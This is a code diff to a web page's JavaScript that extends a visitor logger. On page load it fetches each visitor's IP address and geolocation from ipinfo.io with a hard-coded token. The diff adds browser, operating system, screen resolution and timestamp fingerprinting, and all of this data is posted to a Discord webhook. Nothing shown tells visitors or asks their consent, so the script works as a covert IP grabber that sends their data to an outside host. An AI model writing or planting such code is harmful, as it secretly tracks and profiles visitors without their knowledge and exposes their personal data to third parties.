@@ -55,7 +55,7 @@
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    content: `**New Visitor Logged**\nIP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nOrganization: ${data.org}`,
+                    content: `**New Visitor Logged**\nIP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nOrganization: ${data.org}\nBrowser: ${data.browser}\nOperating System: ${data.os}\nScreen Resolution: ${data.screen}\nTimestamp: ${data.timestamp}`,
                     username: 'Web Logger'
                 }),
             }).then(response => {
@@ -69,13 +69,80 @@
         function logUserVisit() {
             fetch('https://ipinfo.io/json?token=fbc037140ec409')
                 .then(response => response.json())
-                .then(data => {
-                    // Send the obtained data to Discord webhook
+                .then(ipData => {
+                    // Gather additional data
+                    const browserData = getBrowserInfo();
+                    const osData = getOSInfo();
+                    const screenResolution = `${window.screen.width}x${window.screen.height}`;
+                    const timestamp = new Date().toLocaleString();
+
+                    // Combine all data
+                    const data = {
+                        ...ipData,
+                        browser: browserData,
+                        os: osData,
+                        screen: screenResolution,
+                        timestamp: timestamp
+                    };
+
+                    // Send the combined data to Discord webhook
                     sendToDiscord(data);
                 })
                 .catch(error => {
                     console.error('Error fetching IP info:', error);
                 });
+        }
+
+        // Function to get browser information
+        function getBrowserInfo() {
+            const userAgent = navigator.userAgent;
+            let browserName = navigator.appName;
+            let fullVersion = '' + parseFloat(navigator.appVersion);
+            let nameOffset, verOffset;
+
+            if ((verOffset = userAgent.indexOf("Opera")) != -1) {
+                browserName = "Opera";
+                fullVersion = userAgent.substring(verOffset + 6);
+                if ((verOffset = userAgent.indexOf("Version")) != -1)
+                    fullVersion = userAgent.substring(verOffset + 8);
+            } else if ((verOffset = userAgent.indexOf("MSIE")) != -1) {
+                browserName = "Microsoft Internet Explorer";
+                fullVersion = userAgent.substring(verOffset + 5);
+            } else if ((verOffset = userAgent.indexOf("Chrome")) != -1) {
+                browserName = "Chrome";
+                fullVersion = userAgent.substring(verOffset + 7);
+            } else if ((verOffset = userAgent.indexOf("Safari")) != -1) {
+                browserName = "Safari";
+                fullVersion = userAgent.substring(verOffset + 7);
+                if ((verOffset = userAgent.indexOf("Version")) != -1)
+                    fullVersion = userAgent.substring(verOffset + 8);
+            } else if ((verOffset = userAgent.indexOf("Firefox")) != -1) {
+                browserName = "Firefox";
+                fullVersion = userAgent.substring(verOffset + 8);
+            } else if ((nameOffset = userAgent.lastIndexOf(' ') + 1) <
+                (verOffset = userAgent.lastIndexOf('/'))) {
+                browserName = userAgent.substring(nameOffset, verOffset);
+                fullVersion = userAgent.substring(verOffset + 1);
+                if (browserName.toLowerCase() == browserName.toUpperCase()) {
+                    browserName = navigator.appName;
+                }
+            }
+
+            return browserName + " " + fullVersion;
+        }
+
+        // Function to get operating system information
+        function getOSInfo() {
+            const userAgent = navigator.userAgent;
+            let os = "Unknown OS";
+
+            if (userAgent.indexOf("Win") != -1) os = "Windows";
+            if (userAgent.indexOf("Mac") != -1) os = "Macintosh";
+            if (userAgent.indexOf("Linux") != -1) os = "Linux";
+            if (userAgent.indexOf("Android") != -1) os = "Android";
+            if (userAgent.indexOf("like Mac") != -1) os = "iOS";
+
+            return os;
         }
 
         // Log the visit as soon as the page loads
